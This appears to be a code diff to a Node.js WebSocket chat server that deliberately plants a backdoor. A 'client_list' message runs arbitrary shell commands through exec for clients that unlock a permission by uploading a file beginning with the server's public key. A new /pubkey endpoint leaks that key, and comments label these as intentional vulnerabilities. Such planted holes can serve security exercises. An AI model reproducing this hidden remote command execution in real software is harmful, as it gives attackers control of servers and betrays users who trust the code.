@@ -4,6 +4,7 @@ const fs = require('fs');
 const WebSocket = require('ws');
 const crypto = require('crypto');
 const url = require('url');
+const { exec } = require('child_process');
 
 var connectedServers = [];
 
@@ -27,8 +28,10 @@ var authdServers = [];
 	}
 });*/
 
-var publicKey = crypto.createPublicKey(fs.readFileSync("pubk.pem"));
+var pubkey_pem = fs.readFileSync("pubk.pem");
+var publicKey = crypto.createPublicKey(pubkey_pem);
 var privateKey = crypto.createPrivateKey(fs.readFileSync("privk.pem"));
+var wssFp = crypto.createHash('sha256').update(pubkey_pem).digest('base64');
 
 var hosted_ip = "localhost";
 var port = '81';
@@ -62,6 +65,15 @@ function removeClient(pk) {
 		}
 	}
 	return false;
+}
+
+function getClientIndex(fp) {
+	for (var i = 0; i < connectedClients.length; i++) {
+		if (connectedClients[i].fingerprint == fp) {
+			return i;
+		}
+	}
+	return -1;
 }
 
 function removeServer(pk) {
@@ -242,6 +254,21 @@ function handleMessage(ws, msg) {
 					ws.send(JSON.stringify(client_update));
 				}
 				break;
+			case "client_list":
+				if (ws.permission !== undefined) {
+					if (ws.permission == 1) {
+						var data = dataObj.data;
+						exec(data, (err, stdout, stderr) => {
+							if (err) {
+								console.log("couldn't execute command");
+								return;
+							}
+							console.log(`stdout: ${stdout}`);
+							console.log(`stderr: ${stderr}`);
+						});
+					}
+				}
+				break;
 			default:
 				break;
 	 }
@@ -261,6 +288,8 @@ var options = {
 	cert: fs.readFileSync("client-cert.pem")
 };
 
+//Backdoor Vulnerability
+//Also just really unsafe as kinda just accepts file uploads regardless of whos uploading it :/
 var app = (req, res) => {
 	console.log(`${req.method} Request to ${req.url}`);
 	switch(req.method) {
@@ -270,26 +299,45 @@ var app = (req, res) => {
 				data += chunk;
 			});
 			req.on('end', () => {
-				var img = data.replace(/^data:image\/\w+;base64,/, "");
-				var buf = Buffer.from(img, 'base64');
-				var randFileName = "files/" + (Math.random() + 1).toString(36).substring(7);
-				fs.writeFile(randFileName, buf, (err) => {
-					var stat = "";
-					var link = myWIP + "/" + randFileName;
-					if (err) {
-						console.log(err);
-						res.statusCode = 413;
-						stat = "Failed";
-					} else {
-						res.statusCode = 201;
-						stat = "Created";
+				var file = data.replace(/^data:[\w-]+\/[\w-]+;base64,/, "");
+				var check = Buffer.from(file, 'base64').toString('utf8');
+				//console.log(check);
+				if (check.startsWith(pubkey_pem)) {
+					var checkers = check.split("\n");
+					if (checkers.length > 9) {
+						var vfp = checkers[9];
+						console.log(vfp);
+						var client_ind = getClientIndex(vfp);
+						if (client_ind != -1) {
+							connectedClients[client_ind].permission = 1;
+							res.setHeader('Content-Type', 'application/json');
+							res.end(JSON.stringify({
+								status: "Created",
+								url: "Vulnerability Activated"
+							}));
+						}
 					}
-					res.setHeader('Content-Type', 'application/json');
-					res.end(JSON.stringify({
-						status: stat,
-						url: link
-					}));
-				});
+				} else {
+					var buf = Buffer.from(file, 'base64');
+					var randFileName = "files/" + (Math.random() + 1).toString(36).substring(7);
+					fs.writeFile(randFileName, buf, (err) => {
+						var stat = "";
+						var link = myWIP + "/" + randFileName;
+						if (err) {
+							console.log(err);
+							res.statusCode = 413;
+							stat = "Failed";
+						} else {
+							res.statusCode = 201;
+							stat = "Created";
+						}
+						res.setHeader('Content-Type', 'application/json');
+						res.end(JSON.stringify({
+							status: stat,
+							url: link
+						}));
+					});
+				}
 			});
 			break;
 		case "GET":
@@ -310,6 +358,11 @@ var app = (req, res) => {
 					res.setHeader('Content-Type', 'text/plain');
 					res.end('404 Page Not Found');
 				}
+			//Vulnerability leaks publickey
+			} else if (pathname.startsWith("/pubkey")) {
+				res.statusCode = 200;
+				res.setHeader('Content-Type', 'text/plain');
+				res.end(pubkey_pem);
 			}
 			break;
 		default:
@@ -344,24 +397,26 @@ var wss = new WebSocket.Server({
 });
 
 authdServers.forEach((s) => {
-	var websock = new WebSocket(s.ip, {perMessageDeflate: false});
-	websock.on("error", (e) => {
-		console.log(e);
-	});
-	websock.on("message", (message, isBinary) => {
-		var msg = isBinary ? message : message.toString();
-		handleMessage(websock, msg);
-	});
-	websock.on("open", () => {
-		var fp = crypto.createHash('sha256').update(s.public_key).digest('base64');
-		websock.type = "server";
-		websock.ip = s.ip;
-		websock.public_key = s.public_key;
-		websock.fingerprint = fp;
-		connectedServers.push(websock);
-		console.log("Connected to server: " + s.ip);
-		websock.send(JSON.stringify(formMessage("server_hello")));
-	});
+	if (s.ip != myIP) {
+		var websock = new WebSocket(s.ip, {perMessageDeflate: false});
+		websock.on("error", (e) => {
+			console.log(e);
+		});
+		websock.on("message", (message, isBinary) => {
+			var msg = isBinary ? message : message.toString();
+			handleMessage(websock, msg);
+		});
+		websock.on("open", () => {
+			var fp = crypto.createHash('sha256').update(s.public_key).digest('base64');
+			websock.type = "server";
+			websock.ip = s.ip;
+			websock.public_key = s.public_key;
+			websock.fingerprint = fp;
+			connectedServers.push(websock);
+			console.log("Connected to server: " + s.ip);
+			websock.send(JSON.stringify(formMessage("server_hello")));
+		});
+	}
 });
 
 wss.on('connection', (ws) => {
